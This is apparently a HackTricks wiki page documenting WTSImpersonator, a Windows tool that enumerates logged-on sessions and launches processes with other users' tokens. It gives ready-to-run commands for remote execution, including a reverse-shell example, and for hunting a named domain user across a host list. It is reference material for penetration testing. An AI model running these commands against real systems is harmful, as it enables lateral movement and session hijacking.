# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, by Omri Baso, uses Windows Terminal Services APIs exposed through the `\\pipe\LSM_API_service` RPC named pipe to enumerate logged-on sessions and start a process with a selected user's token. It supports local enumeration and execution as well as remote service-based workflows.<sup>[[1]](#references)</sup>

## Core functionality

Its local execution flow uses the following API sequence:<sup>[[1]](#references)[[2]](#references)</sup>

```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```

## Modules and usage

- **Enumerate users:** The tool can enumerate sessions on the local or a remote host.

  - Locally:
    ```bash
    .\WTSImpersonator.exe -m enum
    ```
  - Remotely, specify an IP address or hostname:
    ```bash
    .\WTSImpersonator.exe -m enum -s 192.168.40.131
    ```

- **Execute commands:** The `exec` and `exec-remote` modules need a service context. Microsoft documents that `WTSQueryUserToken` requires the caller to run as `LocalSystem` with the `SE_TCB_NAME` privilege.<sup>[[2]](#references)</sup>

  - Local command execution:
    ```bash
    .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
    ```
  - PsExec can start a `LocalSystem` command prompt for testing:
    ```bash
    .\PsExec64.exe -accepteula -s cmd.exe
    ```

- **Remote command execution:** The remote mode creates a service on the target in a PsExec-like workflow and therefore requires rights to install and start that service.<sup>[[1]](#references)</sup>

  - Example:
    ```bash
    .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
    ```

- **User hunting:** The `user-hunter` module searches a host list for a named user's session and attempts to execute the supplied program in that context.<sup>[[1]](#references)</sup>
  - Usage example:
    ```bash
    .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
    ```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: `WTSQueryUserToken` function](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)

{{#include ../../banners/hacktricks-training.md}}
